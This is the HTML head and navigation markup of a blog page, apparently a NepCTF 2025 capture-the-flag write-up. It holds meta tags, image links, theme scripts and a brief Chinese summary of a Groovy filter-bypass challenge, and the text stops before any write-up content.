<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="Hexo Theme Redefine">
    
    <meta name="author" content="xiaolaisec">
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

    
    <!--- Seo Part-->
    
    <link rel="canonical" href="http://laijunyue.github.io/2025/08/07/nepctf2025 wp/"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
        <meta name="description" content="WEBGooGooVVVY当时Rev有两过滤器都更新了，但是第一个过滤器完全没更换 Easy级别，没什么好说的，就一层简单的过滤为groovy中字符串命令执行的特性,属于是送分，就看谁运气好先开出靶机。 然后RevGroovy一起写，两者其实没区别了。本身是为了考察Groovy整个解析到调用的理解程度，Groovy解析你的payload会经过如下步骤：  初始化：打开源文件并配置环境； 解析：语法">
<meta property="og:type" content="article">
<meta property="og:title" content="NepCTF2025 WP">
<meta property="og:url" content="http://laijunyue.github.io/2025/08/07/NepCTF2025%20WP/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="WEBGooGooVVVY当时Rev有两过滤器都更新了，但是第一个过滤器完全没更换 Easy级别，没什么好说的，就一层简单的过滤为groovy中字符串命令执行的特性,属于是送分，就看谁运气好先开出靶机。 然后RevGroovy一起写，两者其实没区别了。本身是为了考察Groovy整个解析到调用的理解程度，Groovy解析你的payload会经过如下步骤：  初始化：打开源文件并配置环境； 解析：语法">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="file:///C:/Users/27284/AppData/Local/Temp/ksohtml33608/wps2.jpg">
<meta property="og:image" content="file:///C:/Users/27284/AppData/Local/Temp/ksohtml33608/wps4.jpg">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgTHiaoCMxOCeno4G6t2q3DpvvhcMHicoyC8iaY8qGjlobB0uArnBeqib71g/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgUE4nVbM4OyVptibx1mpJ6A5tQ1jPfPRibaianTxZt7hIMPS8EzJLDriciaQ/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgq9ia6b7NOmxk4xEzzZh4ygEMVuNKtSjd0VxkA4ocqg57JJsg48aicNKg/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgKtp5kzS5VolenJqIgSZFoOKWluiajbZQmgl4iaWhNYiaCRYmva2NnbGsw/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXghbkiaoib6l7BOWrveep0lsRh2zGtGHpXV1kzJicgHDibZH7pdibs7G0dqrg/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgUXiaOBpzRibVVuibp9eeQIxQ5lYYGSOOmexB5apFwSNuYiaUFqicoovz4AA/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgvib4Cn2bjeJDtPhkIlLf15utPMmwRCECHx63QT1G8oIoOEJcoa17GgA/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgjbsKDgwfpOz1PicoWxo0hNNd0ILQ4aFBicn24WyCYwegecQWbibLCibjjA/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1">
<meta property="og:image" content="file:///C:/Users/27284/AppData/Local/Temp/ksohtml33608/wps7.jpg">
<meta property="og:image" content="file:///C:/Users/27284/AppData/Local/Temp/ksohtml33608/wps8.jpg">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgxic1nfV4ljoYNeKY6DpboYX36CL6qEfKXcCep4jhyY04tK3R46pBIcg/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgGumUKPrOMj23uMZicBxWU6icJENNtlXdDH1nTMpW7CAssdI1RZHe16GA/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXg5xvpz5cxibLEgfaDBVmcxAEWOp4ntSmnRhLqvmUnS3ursfYJbBfoBgw/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1">
<meta property="og:image" content="file:///C:/Users/27284/AppData/Local/Temp/ksohtml33608/wps9.jpg">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgT2UYlrRpumC3r7TEGTpr0tianCpfhTHrf2iciccyEiah653ZibDdYpuicuLQ/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgRzMo5QmCdMic5ib25unqAR3ibvVU1LPPsluViavKoWMw7vgep72ZLg0Llg/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgXu4LakX7EzSWzj4IltqPKvq0ohgsicXMGiaXeBw4eKNurPp4IDvGBt5w/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgLC8nJgffU6S1ibOVa99icBJLXac9Ij2ACEWzY6YukT4VQEEH5vqIicacg/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgzEAx329OEFXlNjIH2EDqCibz82ibRuMdZMrs35pPUdxxCoCDHBLbUCeQ/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXg9SVhN5yRvHupuWt48OXE5vj4HxjkedEwOUl7v2ALOlhRgiaHDxZicw4A/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgrvnOMDR2kt6aDBBnNVAtOPnOGWeFclprWqkjsnv27XicWMCQsK9jyaA/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgZCNGicsegnxCiavBPoRg3oxMzTLzUeicibRoF367spjZbCSkhbbnapTkMQ/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgCJ3SxzlK02o8hmNHH60kXvZTxbXZgCo0tK4iaic1iaxOibkoVSfkXsicwbw/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgz7HnicesTmPOYLCNNWA9uolCWuU4u35enI60HRA4vwvLADj4dmgMTHQ/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgfInicWwIM8JetKiazzQr7R5HbA2syKvBUMdDMTE9yfLE601g3xLkNYgQ/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgucctW347lEkXHeYg4GoibCQzDPudBzsdsqUlgcpJ5xDia6h9fXM8R6JA/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgLLacz6jq5njaCuYDpWibCvFsn3iayPr3LHKMhicDTA8shNT1s0RhpTCgw/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXg1sfdLXTfpIcYNianecib6iaVpk0XyqKnCa7qfsaicmmibOOAZiao7SWJeGKw/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgG1RzYxCr7kkTbVpvRWAnAfXK4S1PwpDs2cHdAQrVGntgXHVTox8WxQ/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgWUxm9wD1LuF0ibxrIsJ8LwujDSPvCUcM5vWz65LV4ODbkYFpLMMRj1g/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXg2iaiaM6GOYqcyE4ZTpdjFyxlADvM5Ybe7fzCWOePickM06qHGFI6ndjHA/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgYJk2a2ibibF10Pj8GNnXVPB90Ggiccb7IIgdekDPUS6rS4oAZNDmibZicyg/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgel1PGApo7TRzafcdNZWphdah5chZyTsoR8L8cicAZv8P36efWCcc88w/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgFA17yKnuE2FMgfCfyD1OPXOkjkRR4KxQfF5XfufGJkvZ2npj1rRVicA/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgARJibezwpicCgo2jb9VPCUEImibHC9DXI3AAxicd6ialbNC9libLbbuf5C3A/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXg9OvABXgBY1veBzEwyoibPY5xCybXCSH0Mib1ObHXN1MjsZ6zvCPYxmHw/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXguDiaAOL7Yrr34OyKkakqywhg5rTREodd0PsSSUZNYOBBW9knrNcZpxg/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXg79HYgeSlbUQlTA9PhPLPmAZGSOCL5tjABcict3GaLv9E4Sqia3BwvCiaA/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgGDXh2xIequE6EWqaGgIA2tjzcdB19O1zjsIL1K0GHsKoV8qxXfaUZA/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgnmhJ2zRaE48Nh1KiapIemagRnJmeUsiazWhePwQVyQ0GYbh2qftupucg/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgcMfv0qiceHZHXnUNTXSbLCPeQRvvqPobLBUkSUOpAEWNV3sVC7HMggQ/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgpZiaUFtsXZlvhqNaFRmmibCN3tiaGCiboQXYgNibxlOHHyUUPlv8tWDUaicQ/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXg5sY3Dc8jSajDOGzE1ic6uHv9mzu05zFqrFckTtibpedkCdDdTTdIEuCQ/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgpQhm6NfB2oEkVz1IrwGibMHDptTcdJx0Ybx7gdiczlPcLvLBdRTg8KlA/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgI9ddIuQgJpv3RRBdzBrS4MoXpdXwXVNOXYhyx5UkniaWiawLCysDoSKQ/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXggLZWd10zSel7Pyxn13a3cmgb4Wfa10icyhFNe7PlPpaDqUics3kBBPyg/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXg0ibua6pIGJZa8A8gBNXTj6WegxlJsrJz0Y5hnGlibMzL2aP242bOkkVg/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgxaoyztzYTeMMV9ZkVNUXQiaHY4WvLGL2a4L353z8uPZhcpHNwkCiasYg/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgeT6ibyoxBViaXfkicr7yRuiboFztRa0yB9jvXOOguf9UIQ17PmfyeiaVflA/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgRf5Hy7ciaibict013rjfjtqUQUmro8LptYQqv51ILNKcVWHmz50IXG8Xw/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgpnCaxTBOGlTVUFpBOdnG22IkfzvibuvK5O9uparTruoxbYRWlB1PicNg/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgBjibOZc4jGpy509kJmvuoIZbnf5XEFz2TTd4taicGD0LVVUj59eLccWw/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgqia2gZuVbLkfHNHYmyibLN8P0tUWiaDJB11d5AxsO7ibpGCcfdeGcOOMLw/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgbCrzgJIyuqhbgJLZAnum7NOfG8Z45dP6TY0ARAfIBkU9wHceMhibycg/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgiciaHEZR6JOnF0icWMuEAs9qKQbf0C9G0Kq7wwqMInQOV5L0NAYdTUy6A/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1">
<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/oibAlWWZrKeyDuTInF5ic2SnicsDlribicTXgWoasy6tBULhvIRz1gCX0c8icNL6OoWNuPPibc9zrryz0jYQJCibS250uA/640?wx_fmt=png&from=appmsg&watermark=1&tp=wxpic&wxfrom=5&wx_lazy=1">
<meta property="article:published_time" content="2025-08-07T04:30:05.000Z">
<meta property="article:modified_time" content="2025-08-18T16:04:37.461Z">
<meta property="article:author" content="xiaolaisec">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="JAVA">
<meta property="article:tag" content="PHP">
<meta property="article:tag" content="Python">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="file:///C:/Users/27284/AppData/Local/Temp/ksohtml33608/wps2.jpg">
    
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="/images/redefine-favicon.svg" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="/images/redefine-favicon.svg">
    <meta name="theme-color" content="#A31F34">
    <link rel="shortcut icon" href="/images/redefine-favicon.svg">
    <!--- Page Info-->
    
    <title>
        
            NepCTF2025 WP -
        
        Welcome to xiaolaisec&#39;s blog
    </title>

    
<link rel="stylesheet" href="/fonts/Chillax/chillax.css">


    
        <style>
    :root {
        --preloader-background-color: #fff;
        --preloader-text-color: #000;
    }

    @media (prefers-color-scheme: dark) {
        :root {
            --preloader-background-color: #202124;
            --preloader-text-color: #fff;
        }
    }

    @media (prefers-color-scheme: light) {
        :root {
            --preloader-background-color: #fff;
            --preloader-text-color: #000;
        }
    }

    @media (max-width: 600px) {
        .ml13 {
            font-size: 2.6rem !important; /* Adjust this value as needed */
        }
    }

    .preloader {
        display: flex;
        flex-direction: column;
        gap: 1rem; /* Tailwind 'gap-4' is 1rem */
        align-items: center;
        justify-content: center;
        position: fixed;
        padding: 12px;
        top: 0;
        right: 0;
        bottom: 0;
        left: 0;
        width: 100vw;
        height: 100vh; /* 'h-screen' is 100% of the viewport height */
        background-color: var(--preloader-background-color);
        z-index: 1100; /* 'z-[1100]' sets the z-index */
        transition: opacity 0.2s ease-in-out;
    }

    .ml13 {
        font-size: 3.2rem;
        /* text-transform: uppercase; */
        color: var(--preloader-text-color);
        letter-spacing: -1px;
        font-weight: 500;
        font-family: 'Chillax-Variable', sans-serif;
        text-align: center;
    }

    .ml13 .word {
        display: inline-flex;
        flex-wrap: wrap;
        white-space: nowrap;
    }

    .ml13 .letter {
        display: inline-block;
        line-height: 1em;
    }
</style>

<div class="preloader">
    
<script src="/js/libs/anime.min.js"></script>

    <h1 class="ml13">
        Welcome to xiaolaisec&#39;s blog
    </h1>
    <script>
        var textWrapper = document.querySelector('.ml13');
        // Split text into words
        var words = textWrapper.textContent.trim().split(' ');

        // Clear the existing content
        textWrapper.innerHTML = '';

        // Wrap each word and its letters in spans
        words.forEach(function(word) {
            var wordSpan = document.createElement('span');
            wordSpan.classList.add('word');
            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
            textWrapper.appendChild(wordSpan);
            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
        });


        anime.timeline({loop: true})
            .add({
                targets: '.ml13 .letter',
                translateY: [100,0],
                translateZ: 0,
                opacity: [0,1],
                easing: "easeOutExpo",
                duration: 1400,
                delay: (el, i) => 300 + 30 * i
            }).add({
            targets: '.ml13 .letter',
            translateY: [0,-100],
            opacity: [1,0],
            easing: "easeInExpo",
            duration: 1200,
            delay: (el, i) => 100 + 30 * i
        });

        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;

        // If the theme status is not found in local storage, check the preferred color scheme
        if (themeStatus === undefined || themeStatus === null) {
            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
                themeStatus = 'dark';
            } else {
                themeStatus = 'light';
            }
        }

        // Now you can use the themeStatus variable in your code
        if (themeStatus) {
            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
        } else {
            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
            document.documentElement.style.setProperty('--preloader-text-color', '#000');
        }

        window.addEventListener('load', function () {
            hidePreloaderAfterTimeout(1000); // Hide after 1000 milliseconds once the window has loaded
        });

        // Backup failsafe: Hide preloader after a maximum of 5000 milliseconds, regardless of the window load event
        hidePreloaderAfterTimeout(5000);

        function hidePreloaderAfterTimeout(delay) {
            setTimeout(function () {
                var preloader = document.querySelector('.preloader');
                preloader.style.opacity = '0';
                setTimeout(function () {
                    preloader.style.display = 'none';
                }, 200);
            }, delay);
        }
    </script>
</div>
    

    
<link rel="stylesheet" href="/css/style.css">


    
        
<link rel="stylesheet" href="/assets/build/styles.css">

    

    
<link rel="stylesheet" href="/fonts/fonts.css">

    
<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">

    <!--- Font Part-->
    
    
    
    

    <!--- Inject Part-->
    
    <script id="hexo-configurations">
    window.config = {"hostname":"laijunyue.github.io","root":"/","language":"en"};
    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","delete_mask":false,"headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null},"highlight_theme":{"light":"github","dark":"vs2015"}},"toc":{"enable":true,"max_depth":6,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]},"pangu_js":false},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null},"side_tools":{"gear_rotation":true,"auto_expand":false}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"xiaolaisec's blog","subtitle":{"text":["随心所欲地享受每一天\\(￣︶￣*\\))","随时随地，浏览记录O(∩_∩)O","如果喜欢，建议给个支持( •̀ ω •́ )✧","喜欢的话，留个言好嘛(oﾟvﾟ)ノ","你有建议？反馈作者(●^◡^●)","欢迎来到我的博客(｡･∀･)ﾉﾞ","文字正在不断轮换(*￣3￣)╭","正在努力更新博客(ง •_•)ง","正在不断努力改善博客中ε=( o｀ω′)ノ"],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn","show_author":false},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null},"style":"default"}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1"}},"version":"2.6.0","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"}},"search":{"enable":false,"preload":true},"width":{"home":"1200px","pages":"1000px"}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":null,"show_on_mobile":true},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3},"excerpt_length":200},"footerStart":"2022/8/17 11:45:14"};
    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
    window.data = {"masonry":false};
  </script>
    
    <!--- Fontawesome Part-->
    
<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">

    
<link rel="stylesheet" href="/fontawesome/brands.min.css">

    
<link rel="stylesheet" href="/fontawesome/solid.min.css">

    
<link rel="stylesheet" href="/fontawesome/regular.min.css">

    
    
    
    
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
<div class="progress-bar-container">
    

    
        <span class="pjax-progress-bar"></span>
<!--        <span class="swup-progress-icon">-->
<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
<!--        </span>-->
    
</div>


<main class="page-container" id="swup">

    

    <div class="main-content-container">


        <div class="main-content-header">
            <header class="navbar-container">

    <div class="navbar-content">
        <div class="left">
            
            <a class="logo-title" href="/">
                
                Welcome to xiaolaisec&#39;s blog
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/"
                                        >
                                    <i class="fa-regular fa-house fa-fw"></i>
                                    HOME
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile drawer -->
    <div class="navbar-drawer h-screen w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
